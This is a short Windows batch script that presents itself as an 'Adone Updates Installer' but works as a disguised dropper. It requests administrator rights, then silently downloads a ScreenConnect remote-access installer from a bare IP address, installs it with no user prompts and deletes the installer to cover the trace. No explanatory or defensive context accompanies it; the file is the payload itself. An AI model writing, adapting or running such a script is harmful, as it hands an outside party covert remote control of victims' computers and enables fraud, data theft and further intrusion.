@echo off
title Adone Updates Installer


net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -Command "$url='http://207.174.0.98/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$out=\"%TEMP%\ScreenConnect.ClientSetup.msi\";(New-Object Net.WebClient).DownloadFile($url,$out);msiexec /i \"$out\" /quiet /norestart;Start-Sleep 2;Remove-Item $out -Force"

exit
